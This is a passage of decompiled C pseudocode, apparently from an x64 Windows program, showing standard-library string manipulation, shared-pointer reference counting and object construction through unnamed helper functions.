  v7 = a1[2];
  v8 = a4;
  v9 = a3;
  v10 = a2;
  if ( v7 < a2 || (v11 = a4[2], v11 < a5) )
  {
    std::_Xout_of_range("invalid string position");
    JUMPOUT(*(_QWORD *)&byte_1400081F8);
  }
  v12 = a6;
  v13 = v7 - a2;
  if ( v7 - a2 < a3 )
    v9 = v7 - a2;
  v14 = v11 - a5;
  if ( v14 < a6 )
    v12 = v14;
  v15 = v7 - v9;
  if ( -1i64 - v12 <= v7 - v9 )
  {
    std::_Xlength_error("string too long");
    __debugbreak();
  }
  v16 = v15 + v12;
  v17 = v13 - v9;
  if ( v7 < v15 + v12 )
    sub_1400049C0(v6, v15 + v12, 0);
  if ( v6 != v8 )
  {
    v18 = v6[3];
    if ( v18 < 0x10 )
      v19 = (size_t)v6;
    else
      v19 = *v6;
    if ( v18 < 0x10 )
      v20 = (size_t)v6;
    else
      v20 = *v6;
    if ( v17 )
      memmove((void *)(v12 + v20 + v10), (const void *)(v9 + v19 + v10), v17);
    if ( v8[3] >= 0x10 )
      v8 = (size_t *)*v8;
    if ( v6[3] < 0x10 )
      v21 = (size_t)v6;
    else
      v21 = *v6;
    if ( v12 )
      memcpy((void *)(v21 + v10), (char *)v8 + a5, v12);
    goto LABEL_103;
  }
  if ( v12 > v9 )
  {
    if ( a5 > v10 )
    {
      v37 = v6[3];
      if ( v10 + v9 > a5 )
      {
        if ( v37 < 0x10 )
          v43 = (size_t)v6;
        else
          v43 = *v6;
        if ( v37 < 0x10 )
          v44 = (size_t)v6;
        else
          v44 = *v6;
        if ( v9 )
          memmove((void *)(v44 + v10), (const void *)(v43 + a5), v9);
        v45 = v6[3];
        if ( v45 < 0x10 )
          v46 = (size_t)v6;
        else
          v46 = *v6;
        if ( v45 < 0x10 )
          v47 = (size_t)v6;
        else
          v47 = *v6;
        if ( v17 )
          memmove((void *)(v12 + v47 + v10), (const void *)(v9 + v46 + v10), v17);
        v48 = v6[3];
        if ( v48 < 0x10 )
          v49 = (size_t)v6;
        else
          v49 = *v6;
        if ( v48 < 0x10 )
          v50 = (size_t)v6;
        else
          v50 = *v6;
        v28 = v12 - v9;
        if ( v12 != v9 )
        {
          v29 = (const void *)(v12 + v49 + a5);
          v30 = (void *)(v9 + v50 + v10);
          goto LABEL_102;
        }
      }
      else
      {
        if ( v37 < 0x10 )
          v38 = (size_t)v6;
        else
          v38 = *v6;
        if ( v37 < 0x10 )
          v39 = (size_t)v6;
        else
          v39 = *v6;
        if ( v17 )
          memmove((void *)(v12 + v39 + v10), (const void *)(v9 + v38 + v10), v17);
        v40 = v6[3];
        if ( v40 < 0x10 )
          v41 = (size_t)v6;
        else
          v41 = *v6;
        if ( v40 < 0x10 )
          v42 = (size_t)v6;
        else
          v42 = *v6;
        if ( v12 )
        {
          v30 = (void *)(v42 + v10);
          v28 = v12;
          v29 = (const void *)(v12 + a5 + v41 - v9);
          goto LABEL_102;
        }
      }
    }
    else
    {
      v31 = v6[3];
      if ( v31 < 0x10 )
        v32 = (size_t)v6;
      else
        v32 = *v6;
      if ( v31 < 0x10 )
        v33 = (size_t)v6;
      else
        v33 = *v6;
      if ( v17 )
        memmove((void *)(v12 + v33 + v10), (const void *)(v9 + v32 + v10), v17);
      v34 = v6[3];
      if ( v34 < 0x10 )
        v35 = (size_t)v6;
      else
        v35 = *v6;
      if ( v34 < 0x10 )
        v36 = (size_t)v6;
      else
        v36 = *v6;
      if ( v12 )
      {
        v29 = (const void *)(v35 + a5);
        v28 = v12;
        v30 = (void *)(v36 + v10);
        goto LABEL_102;
      }
    }
  }
  else
  {
    v22 = v6[3];
    if ( v22 < 0x10 )
      v23 = (size_t)v6;
    else
      v23 = *v6;
    if ( v22 < 0x10 )
      v24 = (size_t)v6;
    else
      v24 = *v6;
    if ( v12 )
      memmove((void *)(v24 + v10), (const void *)(v23 + a5), v12);
    v25 = v6[3];
    if ( v25 < 0x10 )
      v26 = (size_t)v6;
    else
      v26 = *v6;
    if ( v25 < 0x10 )
      v27 = (size_t)v6;
    else
      v27 = *v6;
    if ( v17 )
    {
      v28 = v17;
      v29 = (const void *)(v9 + v26 + v10);
      v30 = (void *)(v12 + v27 + v10);
LABEL_102:
      memmove(v30, v29, v28);
      goto LABEL_103;
    }
  }
LABEL_103:
  v51 = v6[3] < 0x10;
  v6[2] = v16;
  if ( v51 )
    v52 = (size_t)v6;
  else
    v52 = *v6;
  *(_BYTE *)(v52 + v16) = 0;
  return v6;
}
// 1400081F8: using guessed type char;
// 1400A1768: using guessed type void __stdcall std::_Xout_of_range(const char *);
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (0000000140008200) ----------------------------------------------------
size_t *__usercall sub_140008200@<rax>(void *Src@<rcx>, size_t a2@<rdx>, size_t a3@<r8>, char *a4@<r9>, size_t Size)
{
  const void *v5; // r15
  size_t v6; // rsi
  size_t v7; // r12
  _QWORD *v8; // rbx
  unsigned __int64 v9; // r8
  char *v10; // rax
  char *v11; // rax
  size_t v13; // rcx
  size_t v14; // r14
  size_t v15; // r14
  unsigned __int64 v16; // rax
  _QWORD *v17; // rcx
  _QWORD *v18; // rax
  size_t v19; // r8
  unsigned __int64 v20; // rdi
  unsigned __int64 v21; // rax
  unsigned __int64 v22; // rax
  _QWORD *v23; // rcx
  _QWORD *v24; // rax
  _BYTE *v25; // rax
  bool v26; // cf
  _QWORD *v27; // rax

  v5 = a4;
  v6 = a3;
  v7 = a2;
  v8 = Src;
  if ( !a4 )
    goto LABEL_59;
  v9 = *((_QWORD *)Src + 3);
  v10 = (char *)(v9 < 0x10 ? Src : *(_QWORD *)Src);
  if ( a4 < v10 )
    goto LABEL_59;
  if ( v9 >= 0x10 )
    Src = *(void **)Src;
  if ( (char *)Src + v8[2] <= a4 )
  {
LABEL_59:
    v13 = v8[2];
    if ( v13 < a2 )
    {
      std::_Xout_of_range("invalid string position");
      __debugbreak();
    }
    v14 = v13 - a2;
    if ( v13 - a2 < v6 )
      v6 = v13 - a2;
    if ( -1i64 - Size <= v13 - v6 )
    {
      std::_Xlength_error("string too long");
      __debugbreak();
    }
    v15 = v14 - v6;
    if ( Size < v6 )
    {
      v16 = v8[3];
      v17 = v16 < 0x10 ? v8 : *v8;
      v18 = v16 < 0x10 ? v8 : *v8;
      if ( v15 )
        memmove((char *)v18 + v7 + Size, (char *)v17 + a2 + v6, v15);
    }
    if ( !Size && !v6 )
      return v8;
    v19 = v8[2];
    v20 = Size + v8[2] - v6;
    if ( v20 > 0xFFFFFFFFFFFFFFFEui64 )
    {
      std::_Xlength_error("string too long");
      __debugbreak();
    }
    v21 = v8[3];
    if ( v21 >= v20 )
    {
      if ( v20 )
      {
LABEL_34:
        if ( v6 < Size )
        {
          v22 = v8[3];
          v23 = v22 < 0x10 ? v8 : *v8;
          v24 = v22 < 0x10 ? v8 : *v8;
          if ( v15 )
            memmove((char *)v24 + v7 + Size, (char *)v23 + v7 + v6, v15);
        }
        if ( v8[3] < 0x10ui64 )
          v25 = v8;
        else
          v25 = (_BYTE *)*v8;
        if ( Size )
          memcpy(&v25[v7], v5, Size);
        v26 = v8[3] < 0x10ui64;
        v8[2] = v20;
        if ( v26 )
          v27 = v8;
        else
          v27 = (_QWORD *)*v8;
        *((_BYTE *)v27 + v20) = 0;
        return v8;
      }
      v8[2] = 0i64;
      if ( v21 < 0x10 )
        *(_BYTE *)v8 = 0;
      else
        *(_BYTE *)*v8 = 0;
    }
    else
    {
      sub_140004790(v8, v20, v19);
      if ( v20 )
        goto LABEL_34;
    }
    return v8;
  }
  if ( v9 < 0x10 )
    v11 = (char *)v8;
  else
    v11 = (char *)*v8;
  return sub_140007E80(v8, a2, v6, v8, a4 - v11, Size);
}
// 1400A1768: using guessed type void __stdcall std::_Xout_of_range(const char *);
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (0000000140008430) ----------------------------------------------------
void sub_140008430()
{
  ;
}

//----- (0000000140008450) ----------------------------------------------------
_QWORD *__fastcall sub_140008450(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rdi
  _QWORD *v3; // rbx
  _DWORD *v4; // rax

  v2 = a2;
  v3 = a1;
  *a1 = 0i64;
  v4 = operator new(0x18ui64);
  if ( v4 )
  {
    v4[2] = 1;
    v4[3] = 1;
    *(_QWORD *)v4 = &off_1400A2D78;
    *((_QWORD *)v4 + 2) = v2;
  }
  *v3 = v4;
  return v3;
}
// 1400A2D78: using guessed type __int64 (__fastcall *off_1400A2D78)();

//----- (00000001400084C0) ----------------------------------------------------
_QWORD *__fastcall sub_1400084C0(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rdi
  _QWORD *v3; // rbx
  _DWORD *v4; // rax

  v2 = a2;
  v3 = a1;
  *a1 = 0i64;
  v4 = operator new(0x18ui64);
  if ( v4 )
  {
    v4[2] = 1;
    v4[3] = 1;
    *(_QWORD *)v4 = &off_1400A2D78;
    *((_QWORD *)v4 + 2) = v2;
  }
  *v3 = v4;
  return v3;
}
// 1400A2D78: using guessed type __int64 (__fastcall *off_1400A2D78)();

//----- (0000000140008530) ----------------------------------------------------
_QWORD *__fastcall sub_140008530(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rdi
  _QWORD *v3; // rbx
  _DWORD *v4; // rax

  v2 = a2;
  v3 = a1;
  *a1 = 0i64;
  v4 = operator new(0x18ui64);
  if ( v4 )
  {
    v4[2] = 1;
    v4[3] = 1;
    *(_QWORD *)v4 = &off_1400A2D78;
    *((_QWORD *)v4 + 2) = v2;
  }
  *v3 = v4;
  return v3;
}
// 1400A2D78: using guessed type __int64 (__fastcall *off_1400A2D78)();

//----- (00000001400085A0) ----------------------------------------------------
_QWORD *__fastcall sub_1400085A0(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rdi
  _QWORD *v3; // rbx
  _DWORD *v4; // rax

  v2 = a2;
  v3 = a1;
  *a1 = 0i64;
  v4 = operator new(0x18ui64);
  if ( v4 )
  {
    v4[2] = 1;
    v4[3] = 1;
    *(_QWORD *)v4 = &off_1400A2D78;
    *((_QWORD *)v4 + 2) = v2;
  }
  *v3 = v4;
  return v3;
}
// 1400A2D78: using guessed type __int64 (__fastcall *off_1400A2D78)();

//----- (0000000140008610) ----------------------------------------------------
_QWORD *__fastcall sub_140008610(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rdi
  _QWORD *v3; // rbx
  _DWORD *v4; // rax

  v2 = a2;
  v3 = a1;
  *a1 = 0i64;
  v4 = operator new(0x18ui64);
  if ( v4 )
  {
    v4[2] = 1;
    v4[3] = 1;
    *(_QWORD *)v4 = &off_1400A2D78;
    *((_QWORD *)v4 + 2) = v2;
  }
  *v3 = v4;
  return v3;
}
// 1400A2D78: using guessed type __int64 (__fastcall *off_1400A2D78)();

//----- (0000000140008680) ----------------------------------------------------
_QWORD *__fastcall sub_140008680(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rdi
  _QWORD *v3; // rbx
  _DWORD *v4; // rax

  v2 = a2;
  v3 = a1;
  *a1 = 0i64;
  v4 = operator new(0x18ui64);
  if ( v4 )
  {
    v4[2] = 1;
    v4[3] = 1;
    *(_QWORD *)v4 = &off_1400A2D78;
    *((_QWORD *)v4 + 2) = v2;
  }
  *v3 = v4;
  return v3;
}
// 1400A2D78: using guessed type __int64 (__fastcall *off_1400A2D78)();

//----- (00000001400086F0) ----------------------------------------------------
_QWORD *__fastcall sub_1400086F0(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rdi
  _QWORD *v3; // rbx
  _DWORD *v4; // rax

  v2 = a2;
  v3 = a1;
  *a1 = 0i64;
  v4 = operator new(0x18ui64);
  if ( v4 )
  {
    v4[2] = 1;
    v4[3] = 1;
    *(_QWORD *)v4 = &off_1400A7528;
    *((_QWORD *)v4 + 2) = v2;
  }
  *v3 = v4;
  return v3;
}
// 1400A7528: using guessed type __int64 (__fastcall *off_1400A7528)();

//----- (0000000140008760) ----------------------------------------------------
_QWORD *__fastcall sub_140008760(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rdi
  _QWORD *v3; // rbx
  _DWORD *v4; // rax

  v2 = a2;
  v3 = a1;
  *a1 = 0i64;
  v4 = operator new(0x18ui64);
  if ( v4 )
  {
    v4[2] = 1;
    v4[3] = 1;
    *(_QWORD *)v4 = &off_1400A2D78;
    *((_QWORD *)v4 + 2) = v2;
  }
  *v3 = v4;
  return v3;
}
// 1400A2D78: using guessed type __int64 (__fastcall *off_1400A2D78)();

//----- (00000001400087D0) ----------------------------------------------------
void __fastcall sub_1400087D0(__int64 a1, __int64 a2, __int64 *a3)
{
  __int64 *v3; // rbx
  __int64 *v4; // rax
  __int64 v5; // r10
  volatile signed __int32 *v6; // rbx
  volatile signed __int32 *v7; // [rsp+40h] [rbp+18h]

  v3 = a3;
  v4 = sub_1400085A0(&v7, a2);
  v5 = *v3;
  *v3 = *v4;
  *v4 = v5;
  v6 = v7;
  if ( v7 )
  {
    if ( !_InterlockedDecrement(v7 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v6 + 8i64))(v6);
      if ( !_InterlockedDecrement(v6 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v6 + 16i64))(v6);
    }
  }
  sub_140008430();
}

//----- (0000000140008850) ----------------------------------------------------
__int64 __fastcall sub_140008850(__int64 a1)
{
  volatile signed __int32 *v1; // rbx
  __int64 result; // rax

  v1 = *(volatile signed __int32 **)(a1 + 8);
  if ( v1 && !_InterlockedDecrement(v1 + 2) )
  {
    result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v1 + 8i64))(v1);
    if ( !_InterlockedDecrement(v1 + 3) )
      result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v1 + 16i64))(v1);
  }
  return result;
}

//----- (0000000140008890) ----------------------------------------------------
_QWORD *__fastcall sub_140008890(_QWORD *a1, char a2)
{
  _QWORD *v2; // rbx

  v2 = a1;
  *a1 = &off_1400A2D20;
  if ( a2 & 1 )
    operator delete(a1);
  return v2;
}
// 1400A2D20: using guessed type __int64 (__fastcall *off_1400A2D20)();

//----- (00000001400088C0) ----------------------------------------------------
_QWORD *__fastcall sub_1400088C0(_QWORD *a1, char a2)
{
  _QWORD *v2; // rbx

  v2 = a1;
  a1[1] = &off_1400A2D20;
  *a1 = &off_1400A2D20;
  if ( a2 & 1 )
    operator delete(a1);
  return v2;
}
// 1400A2D20: using guessed type __int64 (__fastcall *off_1400A2D20)();

//----- (0000000140008900) ----------------------------------------------------
_QWORD *__fastcall sub_140008900(__int64 a1, _QWORD *a2)
{
  _QWORD *v2; // r12
  _QWORD *v3; // r15
  _QWORD *v4; // rdi
  volatile signed __int32 **v5; // rdx
  volatile signed __int32 *v6; // rbx
  char *v7; // rax
  __int64 v8; // rdx
  __int64 v9; // rcx
  char *v10; // rbx
  __int64 v11; // r14
  unsigned __int64 v12; // rax
  char *v13; // rdi
  __int64 v14; // rax
  _QWORD *v15; // rax
  _QWORD *v16; // rax
  _QWORD *v17; // rdi
  volatile signed __int32 **v18; // rdx
  volatile signed __int32 *v19; // rbx
  _QWORD *v20; // rbx
  _QWORD *v21; // rax
  _QWORD *v22; // rdi
  __int64 *v23; // rdx
  volatile signed __int32 *v24; // rbx
  _QWORD *v25; // rax
  _QWORD *v26; // rdi
  __int64 *v27; // rdx
  volatile signed __int32 *v28; // rbx
  __int64 *v29; // rdi
  _QWORD *v30; // rbx
  _QWORD *v31; // rax
  volatile signed __int32 *v32; // rbx
  _QWORD *v33; // rax
  __int64 v34; // rdi
  __int64 *v35; // rdx
  __int64 v36; // rcx
  volatile signed __int32 *v37; // rbx
  void *v38; // rcx
  _QWORD *v39; // rdi
  __int64 *v40; // rdx
  __int64 v41; // rcx
  volatile signed __int32 *v42; // rbx
  volatile signed __int32 *v43; // rbx
  _QWORD *v44; // rbx
  size_t v45; // r8
  _QWORD *v46; // rdi
  __int64 *v47; // rdx
  __int64 v48; // rcx
  volatile signed __int32 *v49; // rbx
  void *v50; // r10
  __int64 v51; // rax
  volatile signed __int32 *v52; // rbx
  volatile signed __int32 *v53; // rbx
  volatile signed __int32 *v54; // rbx
  volatile signed __int32 *v55; // rbx
  volatile signed __int32 *v56; // rbx
  volatile signed __int32 *v57; // rbx
  volatile signed __int32 *v58; // rbx
  char v60; // [rsp+40h] [rbp-C0h]
  __int64 v61; // [rsp+50h] [rbp-B0h]
  volatile signed __int32 *v62; // [rsp+58h] [rbp-A8h]
  __int64 v63; // [rsp+60h] [rbp-A0h]
  volatile signed __int32 *v64; // [rsp+68h] [rbp-98h]
  int v65; // [rsp+70h] [rbp-90h]
  int v66; // [rsp+74h] [rbp-8Ch]
  _QWORD *v67; // [rsp+78h] [rbp-88h]
  volatile signed __int32 *v68; // [rsp+80h] [rbp-80h]
  __int64 v69; // [rsp+88h] [rbp-78h]
  volatile signed __int32 *v70; // [rsp+90h] [rbp-70h]
  _QWORD *v71; // [rsp+98h] [rbp-68h]
  volatile signed __int32 *v72; // [rsp+A0h] [rbp-60h]
  _QWORD *v73; // [rsp+A8h] [rbp-58h]
  volatile signed __int32 *v74; // [rsp+B0h] [rbp-50h]
  _QWORD *v75; // [rsp+B8h] [rbp-48h]
  volatile signed __int32 *v76; // [rsp+C0h] [rbp-40h]
  __int64 v77; // [rsp+C8h] [rbp-38h]
  volatile signed __int32 *v78; // [rsp+D0h] [rbp-30h]
  __int64 v79; // [rsp+D8h] [rbp-28h]
  volatile signed __int32 *v80; // [rsp+E0h] [rbp-20h]
  volatile signed __int32 *v81; // [rsp+E8h] [rbp-18h]
  volatile signed __int32 *v82; // [rsp+F0h] [rbp-10h]
  volatile signed __int32 *v83; // [rsp+F8h] [rbp-8h]
  __int64 v84; // [rsp+100h] [rbp+0h]
  volatile signed __int32 *v85; // [rsp+108h] [rbp+8h]
  volatile signed __int32 *v86; // [rsp+110h] [rbp+10h]
  __int64 v87; // [rsp+118h] [rbp+18h]
  volatile signed __int32 *v88; // [rsp+120h] [rbp+20h]
  volatile signed __int32 *v89; // [rsp+128h] [rbp+28h]
  volatile signed __int32 *v90; // [rsp+130h] [rbp+30h]
  volatile signed __int32 *v91; // [rsp+138h] [rbp+38h]
  __int64 v92; // [rsp+140h] [rbp+40h]
  __int64 v93; // [rsp+148h] [rbp+48h]
  void *v94; // [rsp+150h] [rbp+50h]
  __int64 v95; // [rsp+160h] [rbp+60h]
  unsigned __int64 v96; // [rsp+168h] [rbp+68h]
  void *v97; // [rsp+170h] [rbp+70h]
  __int64 v98; // [rsp+180h] [rbp+80h]
  unsigned __int64 v99; // [rsp+188h] [rbp+88h]
  void *v100; // [rsp+190h] [rbp+90h]
  __int64 v101; // [rsp+1A0h] [rbp+A0h]
  unsigned __int64 v102; // [rsp+1A8h] [rbp+A8h]
  void *Src; // [rsp+1B0h] [rbp+B0h]
  __int64 v104; // [rsp+1C0h] [rbp+C0h]
  unsigned __int64 v105; // [rsp+1C8h] [rbp+C8h]
  char Dst[8]; // [rsp+1D0h] [rbp+D0h]

  v92 = -2i64;
  v2 = a2;
  v3 = (_QWORD *)a1;
  v93 = a1;
  v60 = 0;
  v4 = operator new(8ui64);
  if ( v4 )
    *v4 = &off_1400A2D38;
  else
    v4 = 0i64;
  v63 = (__int64)v4;
  v5 = (volatile signed __int32 **)sub_140008680(&v83, (__int64)v4);
  v64 = *v5;
  *v5 = 0i64;
  v6 = v83;
  if ( v83 )
  {
    if ( !_InterlockedDecrement(v83 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v6 + 8i64))(v6);
      if ( !_InterlockedDecrement(v6 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v6 + 16i64))(v6);
    }
  }
  sub_140008430();
  v7 = (char *)sub_1400091F0(&Src);
  v10 = v7;
  v96 = 7i64;
  v95 = 0i64;
  LOWORD(v94) = 0;
  v11 = *((_QWORD *)v7 + 2);
  if ( v11 )
  {
    v12 = *((_QWORD *)v7 + 3);
    if ( v12 < 0x10 )
      v13 = v10;
    else
      v13 = *(char **)v10;
    if ( v12 >= 0x10 )
      v10 = *(char **)v10;
    v14 = sub_140031970(v9, v8);
    sub_140030C60(v10, &v13[v11], &v94, v14);
  }
  v15 = sub_14007A1A0();
  sub_140003DE0(&v100, v15, &v94);
  if ( v96 >= 8 )
    operator delete(v94);
  v96 = 7i64;
  v95 = 0i64;
  LOWORD(v94) = 0;
  if ( v105 >= 0x10 )
    operator delete(Src);
  v105 = 15i64;
  v104 = 0i64;
  LOBYTE(Src) = 0;
  v16 = operator new(0x28ui64);
  if ( v16 )
    v17 = sub_14000E6F0(v16);
  else
    v17 = 0i64;
  v61 = (__int64)v17;
  v18 = (volatile signed __int32 **)sub_140008450(&v86, (__int64)v17);
  v62 = *v18;
  *v18 = 0i64;
  v19 = v86;
  if ( v86 )
  {
    if ( !_InterlockedDecrement(v86 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v19 + 8i64))(v19);
      if ( !_InterlockedDecrement(v19 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v19 + 16i64))(v19);
    }
  }
  sub_140008430();
  v20 = operator new(0x48ui64);
  if ( v20 )
  {
    v21 = sub_14007A1A0();
    v22 = sub_14000EC20(v20, v21, v2);
  }
  else
  {
    v22 = 0i64;
  }
  v75 = v22;
  v76 = 0i64;
  v23 = sub_1400084C0(&v91, (__int64)v22);
  v76 = (volatile signed __int32 *)*v23;
  *v23 = 0i64;
  v24 = v91;
  if ( v91 )
  {
    if ( !_InterlockedDecrement(v91 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v24 + 8i64))(v24);
      if ( !_InterlockedDecrement(v24 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v24 + 16i64))(v24);
    }
  }
  sub_140008430();
  v25 = operator new(0x28ui64);
  if ( v25 )
    v26 = sub_14000F0D0(v25, v2);
  else
    v26 = 0i64;
  v71 = v26;
  v72 = 0i64;
  v27 = sub_140008530(&v82, (__int64)v26);
  v72 = (volatile signed __int32 *)*v27;
  *v27 = 0i64;
  v28 = v82;
  if ( v82 )
  {
    if ( !_InterlockedDecrement(v82 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v28 + 8i64))(v28);
      if ( !_InterlockedDecrement(v28 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v28 + 16i64))(v28);
    }
  }
  sub_140008430();
  v66 = 3;
  sub_14000E8E0(v61, &v66, (__int64 *)&v75);
  v65 = 2;
  sub_14000E8E0(v61, &v65, (__int64 *)&v71);
  v84 = v63;
  v85 = v64;
  if ( v64 )
    _InterlockedIncrement(v64 + 2);
  v29 = (__int64 *)sub_140028770(v61);
  v30 = sub_14007A1A0();
  v31 = sub_14007A1A0();
  sub_140011EA0((__int64)&v77, v2, &v84, (__int64)&v100, v31, v30, v29);
  v32 = v85;
  if ( v85 )
  {
    if ( !_InterlockedDecrement(v85 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v32 + 8i64))(v32);
      if ( !_InterlockedDecrement(v32 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v32 + 16i64))(v32);
    }
  }
  v33 = operator new(0x10ui64);
  v34 = (__int64)v33;
  if ( v33 )
  {
    *v33 = &off_1400A2D60;
    v33[1] = &off_1400A2D48;
  }
  else
  {
    v34 = 0i64;
  }
  v69 = v34;
  v70 = 0i64;
  v35 = sub_140008610(&v90, v34);
  v36 = (__int64)v70;
  v70 = (volatile signed __int32 *)*v35;
  *v35 = v36;
  v37 = v90;
  if ( v90 )
  {
    if ( !_InterlockedDecrement(v90 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v37 + 8i64))(v37);
      if ( !_InterlockedDecrement(v37 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v37 + 16i64))(v37);
    }
  }
  sub_140008430();
  v38 = operator new(0x90ui64);
  if ( v38 )
  {
    if ( v77 )
      v79 = v77 + 8;
    else
      v79 = 0i64;
    v80 = v78;
    if ( v78 )
      _InterlockedIncrement(v78 + 2);
    v60 = 1;
    v39 = sub_1400766D0((__int64)v38, v2, &v79, &v69);
  }
  else
  {
    v39 = 0i64;
  }
  v67 = v39;
  v68 = 0i64;
  v40 = sub_140008760(&v81, (__int64)v39);
  v41 = (__int64)v68;
  v68 = (volatile signed __int32 *)*v40;
  *v40 = v41;
  v42 = v81;
  if ( v81 )
  {
    if ( !_InterlockedDecrement(v81 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v42 + 8i64))(v42);
      if ( !_InterlockedDecrement(v42 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v42 + 16i64))(v42);
    }
  }
  sub_140008430();
  if ( v60 & 1 )
  {
    v60 &= 0xFEu;
    v43 = v80;
    if ( v80 )
    {
      if ( !_InterlockedDecrement(v80 + 2) )
      {
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v43 + 8i64))(v43);
        if ( !_InterlockedDecrement(v43 + 3) )
          (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v43 + 16i64))(v43);
      }
    }
  }
  memset(Dst, 0, 0x200ui64);
  sub_14000F470(Dst, 512i64);
  v44 = operator new(0x18ui64);
  if ( v44 )
  {
    v99 = 15i64;
    v98 = 0i64;
    LOBYTE(v97) = 0;
    if ( Dst[0] )
    {
      v45 = -1i64;
      do
        ++v45;
      while ( Dst[v45] );
    }
    else
    {
      v45 = 0i64;
    }
    sub_140004F20(&v97, Dst, v45);
    v60 |= 2u;
    v46 = sub_14000F350(v44, &v97);
  }
  else
  {
    v46 = 0i64;
  }
  v73 = v46;
  v74 = 0i64;
  v47 = sub_1400086F0(&v89, (__int64)v46);
  v48 = (__int64)v74;
  v74 = (volatile signed __int32 *)*v47;
  *v47 = v48;
  v49 = v89;
  if ( v89 )
  {
    if ( !_InterlockedDecrement(v89 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v49 + 8i64))(v49);
      if ( !_InterlockedDecrement(v49 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v49 + 16i64))(v49);
    }
  }
  sub_140008430();
  if ( v60 & 2 )
  {
    v60 &= 0xFDu;
    if ( v99 >= 0x10 )
      operator delete(v97);
    v99 = 15i64;
    v98 = 0i64;
    LOBYTE(v97) = 0;
  }
  v50 = operator new(0x90ui64);
  if ( v50 )
  {
    v87 = v61;
    v88 = v62;
    if ( v62 )
      _InterlockedIncrement(v62 + 2);
    v60 |= 4u;
    v51 = sub_140005C40((__int64)v50, v2, &v67, &v73, &v77, &v87);
  }
  else
  {
    v51 = 0i64;
  }
  *v3 = v51;
  v3[1] = 0i64;
  sub_1400087D0((__int64)v3, v51, v3 + 1);
  if ( ((unsigned __int8)v60 | 8) & 4 )
  {
    v52 = v88;
    if ( v88 )
    {
      if ( !_InterlockedDecrement(v88 + 2) )
      {
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v52 + 8i64))(v52);
        if ( !_InterlockedDecrement(v52 + 3) )
          (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v52 + 16i64))(v52);
      }
    }
  }
  v53 = v74;
  if ( v74 )
  {
    if ( !_InterlockedDecrement(v74 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v53 + 8i64))(v53);
      if ( !_InterlockedDecrement(v53 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v53 + 16i64))(v53);
    }
  }
  v54 = v68;
  if ( v68 )
  {
    if ( !_InterlockedDecrement(v68 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v54 + 8i64))(v54);
      if ( !_InterlockedDecrement(v54 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v54 + 16i64))(v54);
    }
  }
  v55 = v70;
  if ( v70 )
  {
    if ( !_InterlockedDecrement(v70 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v55 + 8i64))(v55);
      if ( !_InterlockedDecrement(v55 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v55 + 16i64))(v55);
    }
  }
  v56 = v78;
  if ( v78 )
  {
    if ( !_InterlockedDecrement(v78 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v56 + 8i64))(v56);
      if ( !_InterlockedDecrement(v56 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v56 + 16i64))(v56);
    }
  }
  v57 = v72;
  if ( v72 )
  {
    if ( !_InterlockedDecrement(v72 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v57 + 8i64))(v57);
      if ( !_InterlockedDecrement(v57 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v57 + 16i64))(v57);
    }
  }
  v58 = v76;
  if ( v76 )
  {
    if ( !_InterlockedDecrement(v76 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v58 + 8i64))(v58);
      if ( !_InterlockedDecrement(v58 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v58 + 16i64))(v58);
    }
  }
  if ( v62 )
  {
    if ( !_InterlockedDecrement(v62 + 2) )
    {
